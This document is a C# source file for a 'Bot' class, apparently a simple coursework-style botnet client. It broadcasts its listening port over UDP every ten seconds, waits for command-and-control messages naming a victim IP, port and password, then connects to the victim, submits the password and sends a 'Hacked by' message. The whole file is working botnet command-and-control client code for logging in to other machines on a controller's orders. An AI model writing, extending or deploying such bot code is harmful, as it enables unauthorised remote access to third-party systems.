using System;
using System.Collections;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Bot
{
    public class BotClass
    {
        private String message;
        private int listeningPort;
        private IPAddress localIPAddress;


        public BotClass()
        {
            localIPAddress = getLocalIpAdress();
            listeningPort = getFreeUPDListeningPort();

            Console.WriteLine("Bot is listening on post " + listeningPort);
            message = "" + listeningPort;
            Timer stopGarbigeCollector = startUdpBroadcast();
            startListening();

        }


        /// <summary>
        /// Gets a free port number.
        /// </summary>
        /// <returns></returns>
        private int getFreeUPDListeningPort()
        {
            // Get all Active port numbers
            IPGlobalProperties ipGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
            IPEndPoint[] udpIPEndPoint = ipGlobalProperties.GetActiveUdpListeners();

            int port = 0;
            bool isAvailable = false;
            Random rnd = new Random();
            // Get a random number and check if its free
            while (!isAvailable)
            {
                port = rnd.Next(3000, 4000);
                bool breakBool = false;
                foreach(IPEndPoint udpIP in udpIPEndPoint)
                {
                    if (udpIP.Port == port)
                    {
                        breakBool = true;
                        break;
                    }
                }
                // if the random port that was selected is not accupied will get it to break the loop and return the port
                if (!breakBool)
                {
                    isAvailable = true;
                }
            }
            return port;

        }

        /// <summary>
        /// Start Broadcasting the message on a different thread
        /// The thread will broadcast the message every 10 seconds
        /// </summary>
        /// <returns>
        /// The timer of the tread for potentialy future use
        /// </returns>
        public Timer startUdpBroadcast()
        {
            var startTimeSpan = TimeSpan.Zero;
            var periodTimeSpan = TimeSpan.FromSeconds(10);
            int broadcastingPort = listeningPort;
            while (broadcastingPort == listeningPort)
                broadcastingPort = getFreeUPDListeningPort();
            //IPEndPoint clientIPEndPoint = new IPEndPoint(IPAddress.Any,0);
            IPEndPoint clientIPEndPoint = new IPEndPoint(localIPAddress, broadcastingPort);
            UdpClient client = new UdpClient(clientIPEndPoint);
            client.EnableBroadcast = true;
            IPEndPoint ip = new IPEndPoint(IPAddress.Broadcast, 31337);
            
            byte[] bytes = BitConverter.GetBytes(listeningPort);

            var timer = new System.Threading.Timer((e) =>
            {
                broadcast(client, ip, bytes);
            }, null, startTimeSpan, periodTimeSpan);
            return timer;
            
        }


        public void broadcast(UdpClient client, IPEndPoint ip, Byte[] bytes)
        {
            client.Send(bytes, bytes.Length, ip);
        }

        /// <summary>
        /// Start Listening for a server to send an attack command.
        /// When a command will arrive the function will start the attack.
        /// </summary>
        public void startListening()
        {
            // Setup the listening socket
            IPEndPoint botListeningEndPoint = new IPEndPoint(IPAddress.Any, listeningPort);
            UdpClient botListeningSocket = new UdpClient(botListeningEndPoint);
            IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);

            byte[] data = new byte[44];

            while (true)
            {
                try
                {
                    Console.WriteLine("Waiting for an attack instruction...");

                    // Get data from CCServer
                    data = botListeningSocket.Receive(ref sender);
                    if (data.Length != 44)
                        continue;

                    // Setup data in arrays
                    byte[] IPaddressVictim = getSubArray(data, 0, 4);
                    byte[] PortVictim = new byte[4];
                    for (int i = 4; i < 6; i++)
                        PortVictim[i - 4] = data[i];
                    byte[] VictimPassByteArr = getSubArray(data, 6, 12);
                    byte[] serverNameByteArr = getSubArray(data, 12, 44);

                    String serverName = convertBytesToString(serverNameByteArr);
                    Console.WriteLine("Recieved an attacking command from: " + serverName);

                    // Set the address of the victim
                    IPAddress addressIP = new IPAddress(IPaddressVictim);
                    IPEndPoint iPEndPointVictim = new IPEndPoint(addressIP, convertByteArrToInt(PortVictim));

                    TcpClient tcpAttackerSocket = new TcpClient();


                    // Connect to victim, create stream
                    tcpAttackerSocket.Connect(iPEndPointVictim);
                    NetworkStream nwStream = tcpAttackerSocket.GetStream();

                    // Wait for message from server
                    byte[] recievedFromVictim = new byte[tcpAttackerSocket.ReceiveBufferSize];
                    int bytesRecieved = nwStream.Read(recievedFromVictim, 0, tcpAttackerSocket.ReceiveBufferSize);

                    // Password request = Please enter your password\r\n - 28 Bytes
                    byte[] passwordRequest = getSubArray(recievedFromVictim, 0, 28);

                    if (bytesRecieved != 28)
                        continue;
                    
                    String messageFromVictim_enterPass = Encoding.ASCII.GetString(passwordRequest);
                    Console.WriteLine("Password request");
                    if (messageFromVictim_enterPass.Equals("Please enter your password\r\n"))
                    {
                        // Send password to server
                        nwStream.Write(VictimPassByteArr, 0, VictimPassByteArr.Length);
                        Console.WriteLine(convertBytesToString(VictimPassByteArr));

                        // Wait for Server - get message
                        recievedFromVictim = new byte[tcpAttackerSocket.ReceiveBufferSize];
                        bytesRecieved = nwStream.Read(recievedFromVictim, 0, tcpAttackerSocket.ReceiveBufferSize);

                        // Confirmation message = "Access granted\r\n" - 16 Bytes
                        byte[] confirmationMessage = getSubArray(recievedFromVictim, 0, 16);
                        Console.WriteLine("Confirmation Message");
                        if (bytesRecieved != 16)
                            continue;

                        String messageFromVictim_accessGranted = Encoding.ASCII.GetString(confirmationMessage);
                        if (messageFromVictim_accessGranted.Equals("Access granted\r\n"))
                        {
                            // Send the victim the 'Hacked By' messeage
                            String hacked = "Hacked by " + serverName + "\r\n";
                            byte[] hackedByteArr = Encoding.ASCII.GetBytes(hacked);
                            nwStream.Write(hackedByteArr, 0, hackedByteArr.Length);

                        }
                    }
                    nwStream.Close();
                    tcpAttackerSocket.Close();

                }catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }

            }

        }



        // ***      Generic methods      ***     

        /// <summary>
        /// Gets an Array Contaning part of the given array
        /// </summary>
        /// <param name="original">The ByteArray we want to copy part of.</param>
        /// <param name="start">Index of from where to start</param>
        /// <param name="end">Index to stop the copy</param>
        /// <returns></returns>
        private byte[] getSubArray(byte[] original,int start,int end)
        {
            byte[] subArray = new byte[end - start];
            for (int i = start; i < end; i++)
                subArray[i - start] = original[i];
            return subArray;
        }


        private int convertByteArrToInt(byte[] bytes)
        {
            int value = BitConverter.ToInt32(bytes, 0);
            return value;
        }

        private String convertBytesToString(byte[] value)
        {
            return Encoding.ASCII.GetString(value);
        }


        public static IPAddress getLocalIpAdress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip;
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }



    }

}
